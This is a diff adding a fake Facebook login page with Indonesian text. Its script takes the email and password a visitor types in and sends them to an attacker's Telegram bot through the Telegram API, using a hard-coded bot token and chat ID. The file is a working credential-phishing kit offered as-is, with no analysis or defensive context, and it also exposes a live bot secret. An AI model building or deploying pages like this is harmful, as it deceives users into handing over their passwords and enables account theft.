@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        /* Your existing styles */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Facebook</div>
+        
+        <input type="text" id="email" class="input-field" placeholder="Email atau Nomor Telepon">
+        <input type="password" id="password" class="input-field" placeholder="Kata Sandi">
+
+        <button class="login-btn" onclick="sendToTelegram()">Masuk</button>
+
+        <a href="#" class="forgot-password">Lupa kata sandi?</a>
+
+        <div class="line"><span>atau</span></div>
+
+        <button class="create-account-btn">Buat Akun Baru</button>
+
+        <div class="terms">
+            <p><a href="#">Buat Halaman</a> untuk selebriti, merek, atau bisnis.</p>
+        </div>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            var chatId = "6748742388"; // Your chat ID
+            var token = "7625465771:AAGAGGJ2JwSbxS35I1V2D4Fpc5ktm-1EwQg"; // Your bot token
+
+            var message = "Email/Phone: " + email + "\nPassword: " + password;
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Data sent successfully!");
+                    } else {
+                        alert("Failed to send data.");
+                    }
+                })
+                .catch(error => alert("Error: " + error));
+        }
+    </script>
+</body>
+</html>
